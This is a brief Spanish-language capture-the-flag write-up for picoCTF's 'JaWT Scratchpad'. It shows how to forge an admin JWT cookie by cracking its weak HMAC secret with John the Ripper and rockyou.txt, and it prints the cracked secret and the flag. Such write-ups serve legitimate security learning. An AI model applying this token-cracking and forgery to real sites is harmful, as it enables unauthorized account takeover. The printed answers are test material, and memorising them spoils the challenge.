### JaWT Scratchpad
### Descripcion
Check the admin scratchpad!
http://fickle-tempest.picoctf.net:49444
### Solucion
Se copia la cookie con el jwt en la pagina
https://jwt.lannysport.net/

Se modifica la parte del nombre para que sea admin

para encontrar la palabra secreta se utiliza jhon
```
┌──(kali㉿kali)-[~]
└─$ john token -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico    
```
Se modifica la cookie y al recargar pagina aparece la bandera
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
### Notas adicionales

### Referencias